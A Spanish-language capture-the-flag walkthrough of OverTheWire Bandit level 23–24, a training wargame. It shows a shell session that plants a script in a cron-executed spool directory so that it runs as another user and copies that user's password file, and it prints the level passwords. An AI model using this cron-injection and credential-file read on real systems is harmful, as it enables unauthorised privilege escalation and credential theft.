# Level 23--24
## Objetivo
Un programa se ejecuta automáticamente a intervalos regulares desde **cron** , el programador de trabajos basado en el tiempo. Busque en **/etc/cron.d/** la configuración y vea qué comando se está ejecutando.

**NOTA:** Este nivel requiere que cree su propio primer script de shell. ¡Este es un gran paso y deberías estar orgulloso de ti mismo cuando superes este nivel!

**NOTA 2:** Tenga en cuenta que su script de shell se elimina una vez ejecutado, por lo que es posible que desee conservar una copia...

```
Server    : bbandit23@bandit.labs.overthewire.org
Password  : QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
## Solución
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220

bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/kd
mkdir: cannot create directory ‘/tmp/kd’: File exists
bandit23@bandit:~$ cd /tmp/kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 > /tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls –la
ls: cannot access '–la': No such file or directory
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls –la
ls: cannot access '–la': No such file or directory
bandit23@bandit:/tmp/kd$ date
Wed Sep 20 05:26:12 AM UTC 2023
bandit23@bandit:/tmp/kd$ ls –la
ls: cannot access '–la': No such file or directory
bandit23@bandit:/tmp/kd$ ls -la
total 10568
drwxrwxr-x    2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 1827 root     root     10801152 Sep 20 05:26 ..
-rw-rw-rw-    1 bandit23 bandit23       33 Sep 20 05:26 password
-rwxrwxr-x    1 bandit23 bandit23       49 Sep 20 05:25 script.sh
bandit23@bandit:/tmp/kd$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/kd$
```
## Notas adicionales
| Comando | Descripción |
|---------|-------------|
|ls| lista de los archivos en la carpeta actual|
|cd/| me lleva al directorio raíz|
|cat| se utiliza para concatenar y mostrar el contenido de uno o varios archivos en la salida estándar |
|file| se utiliza para determinar el tipo de archivo mediante su contenido |
|du| se utiliza para mostrar el uso del espacio en disco por archivos y directorios  |
|find| se utiliza para buscar archivos y directorios en una jerarquía de directorios determinada   |
|-a| no ignora los archivos que comienzan con .|
|-l| hacer un listado largo de archivos|
|grep| e utiliza para buscar patrones de texto en archivos o en la salida de otros comandos. |
|man| comando que se utiliza para acceder a las páginas del manual (manuales) que proporcionan documentación detallada sobre diversos comandos, utilidades y funciones del sistema.|
|sort| se utiliza para ordenar líneas de texto en orden alfabético o numérico.|
|uniq| se utiliza para eliminar o mostrar líneas duplicadas consecutivas en un archivo de texto o en la entrada estándar.|
|strings| se utiliza para extraer y mostrar las cadenas de texto legibles en archivos binarios.|
|base64| se utiliza para codificar y decodificar datos en formato base64. Base64 es un sistema de codificación que convierte datos binarios en una representación de texto compuesta por caracteres ASCII imprimibles. |
|tr| se utiliza para realizar transformaciones de caracteres en texto. |
|tar| se utiliza para crear, visualizar, extraer y manipular archivos de formato tar, que son comunes en sistemas basados en Unix |
|gzip| se utiliza para comprimir y descomprimir archivos utilizando el algoritmo de compresión GZIP|
|bzip2| se utiliza para comprimir y descomprimir archivos utilizando el algoritmo de compresión BZIP2. Al igual que GZIP, BZIP2 es un algoritmo de compresión que reduce el tamaño de los archivos para ahorrar espacio en disco y mejorar la eficiencia en la transferencia de datos. |
|xxd| se utiliza para mostrar o crear representaciones hexadecimales y ASCII de archivos binarios. |
| mkdir | Se utiliza para crear directorios o carpetas|


## Referencias